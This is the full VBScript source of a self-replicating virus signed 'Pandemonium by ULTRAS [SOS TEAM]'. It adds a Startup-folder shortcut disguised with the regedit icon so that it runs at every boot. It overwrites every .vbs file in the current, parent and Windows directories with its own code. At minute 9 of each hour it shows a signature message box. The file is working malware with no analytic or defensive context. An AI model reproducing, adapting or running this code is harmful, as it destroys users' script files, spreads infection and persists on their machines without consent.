On Error Resume Next
Dim WSHShell
Set WshShell = Wscript.CreateObject("Wscript.Shell")
Dim MyShortcut, StartPath
StartPath = WSHShell.SpecialFolders("Startup")
Set MyShortcut = WSHShell.CreateShortcut(StartPath & "\Startup.lnk")
MyShortcut.TargetPath = WSHShell.ExpandEnvironmentStrings("%windir%\ultras.vbs")
MyShortcut.WorkingDirectory = WSHShell.ExpandEnvironmentStrings("%windir%")
MyShortcut.WindowStyle = 4
MyShortcut.IconLocation = WSHShell.ExpandEnvironmentStrings("%windir%\regedit.exe, 0")
MyShortcut.Save
CommandPath = WSHShell.ExpandEnvironmentStrings("%comspec%")
WshShell.Run (CommandPath & " /c for %%a in (*.vbs ..\*.vbs %windir%\*.vbs) do copy /y " & Wscript.ScriptFullName & " %%a >nul")
If Minute(Now()) = 9 Then
Dim MeS
'Pandemonium by ULTRAS [SOS]
Pandemonium_meS   = "Pandemonium by ULTRAS"
Pandemonium_teX     = "[SOS TEAM]"
MeS =  MsgBox(Pandemonium_meS, vbOKCancel + vbCritical, Pandemonium_teX )
If MeS = vbCancel Then
WScript.Quit
End If
End If
